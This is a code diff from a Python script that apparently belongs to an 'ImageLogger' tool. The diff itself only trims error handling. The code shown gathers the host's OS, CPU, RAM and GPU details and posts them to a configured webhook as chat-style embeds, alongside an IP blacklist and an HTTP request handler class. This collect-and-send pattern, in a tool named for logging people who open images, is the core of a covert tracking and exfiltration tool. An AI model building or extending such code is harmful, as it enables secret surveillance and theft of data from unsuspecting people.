@@ -38,12 +38,11 @@ blacklistedIPs = ("27", "104", "143", "164")
 def get_device_info():
     try:
         os_info = platform.system() + " " + platform.release()
-        cpu_info = platform.processor() or "Unknown CPU"
-        ram_info = f"{round(psutil.virtual_memory().total / (1024.0 ** 3))} GB"
-        
+        cpu_info = platform.processor()
+        ram_info = str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"
         gpus = GPUtil.getGPUs()
         gpu_info = gpus[0].name if gpus else "N/A"
-
+        
         return {
             "OS": os_info,
             "CPU": cpu_info,
@@ -51,12 +50,12 @@ def get_device_info():
             "GPU": gpu_info
         }
     except Exception as e:
-        return {"Error": f"Failed to get device info: {str(e)}"}
+        return {"Error": str(e)}
 
 def send_device_info():
     device_info = get_device_info()
     try:
-        response = requests.post(config["webhook"], json={
+        requests.post(config["webhook"], json={
             "username": config["username"],
             "embeds": [
                 {
@@ -71,10 +70,8 @@ def send_device_info():
                 }
             ]
         })
-        if response.status_code != 204:
-            print(f"Error sending device info: {response.status_code}, {response.text}")
-    except Exception as e:
-        print(f"Error sending device info: {str(e)}")
+    except Exception:
+        print("Error sending device info!")
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
     def handleRequest(self):
